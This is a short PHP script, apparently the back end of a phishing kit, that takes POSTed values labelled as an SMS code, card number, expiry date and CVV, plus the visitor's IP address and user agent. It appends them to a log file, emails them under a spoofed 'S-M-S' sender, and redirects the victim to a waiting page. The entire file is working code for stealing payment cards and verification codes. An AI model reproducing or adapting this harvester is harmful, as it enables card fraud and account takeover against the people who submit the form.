<?
include 'emailk.php';
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------------------------------------------\n";
$message .= "code               : ".$_POST['Phone']."\n";
$message .= "---------------------------------------------\n";
$message .= "".$_SERVER['REMOTE_ADDR']." | ".date("m/d/Y g:i:a")."\n";
$message .= "---------------------------------------------\n";
$message .= "UserAgent                  : $useragent\n";
$message .= "---------------------------------------------\n";
$subject = "".$_POST['soo']." | ".$_POST['cardid1']." | ".$_POST['cd']." | ".$_POST['cvv']." | $ip =?UTF-8?Q?=E2=9C=94_?=";
$f = fopen("../../S1.txt", "a");
fwrite($f, $message); 
$from = "From: S-M-S <news@sm.dioury.hk>";
@mail($send,$subject,$message,$from);
@header("Location: wait2.html");
